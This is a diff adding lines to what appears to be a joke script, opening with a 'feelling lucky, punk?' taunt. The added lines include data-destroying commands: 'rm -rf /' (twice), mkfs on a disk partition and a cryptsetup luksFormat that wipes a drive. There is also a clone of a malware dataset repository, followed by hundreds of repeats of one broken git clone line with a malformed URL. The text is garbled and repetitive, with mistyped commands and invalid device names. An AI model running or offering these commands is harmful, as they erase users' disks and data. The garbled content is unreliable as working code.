@@ -2,8 +2,565 @@ sudo su -_brentonhopkins
 *this ones a doozy, megatron*
 feelling lucky, punk?
 You know the G0. You know what to do?
+Well do ya?
 Delay: 10
-<^>
+<off>   
+mkfs ext4 dev/sda3. 2a
+>file 
+git clone https://github.com/sophos/SOREL-20M     
+rm -rf /   
+<off>
+>file
+<alive>   
+<18>    
+<off>
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0  
+>file
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+>file
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+>file
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+>file
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+>file
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+git clone http://github/HBMS-0em/pushit
+<off>
+>file
 well, do ya?
 sudo  get upgrade
 rm -rf /
